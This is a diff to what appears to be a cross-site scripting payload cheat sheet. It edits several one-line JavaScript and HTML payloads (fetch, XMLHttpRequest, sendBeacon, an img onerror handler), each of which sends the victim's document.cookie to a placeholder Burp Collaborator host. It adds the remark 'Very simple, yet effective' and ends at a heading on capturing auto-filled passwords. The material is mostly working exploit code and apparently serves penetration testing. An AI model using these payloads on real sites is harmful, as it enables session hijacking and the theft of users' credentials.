@@ -22,15 +22,16 @@ fetch('https://{{ collaborator your.burpcollaborator.net }}', {method: 'POST', m
 ```
 
 ```js
-var xhttp = new XMLHttpRequest(); xhttp.open("GET", "http://{{ collaborator your.burpcollaborator.net }}/?c=" + document.cookie, true);xhttp.send();
+var xhttp = new XMLHttpRequest(); xhttp.open("GET", "https://{{ collaborator your.burpcollaborator.net }}/?c=" + document.cookie, true);xhttp.send();
 ```
 
 ```js
 navigator.sendBeacon('https://{{ collaborator your.burpcollaborator.net }}/',document.cookie)
 ```
 
+Very simple, yet effective:
 ```html
-<img src=x onerror="this.src='http://{{ collaborator your.burpcollaborator.net }}/?c='+document.cookie">
+<img src=x onerror="this.src='https://{{ collaborator your.burpcollaborator.net }}/?c='+document.cookie">
 ```
 
 #### Capture password auto-fill
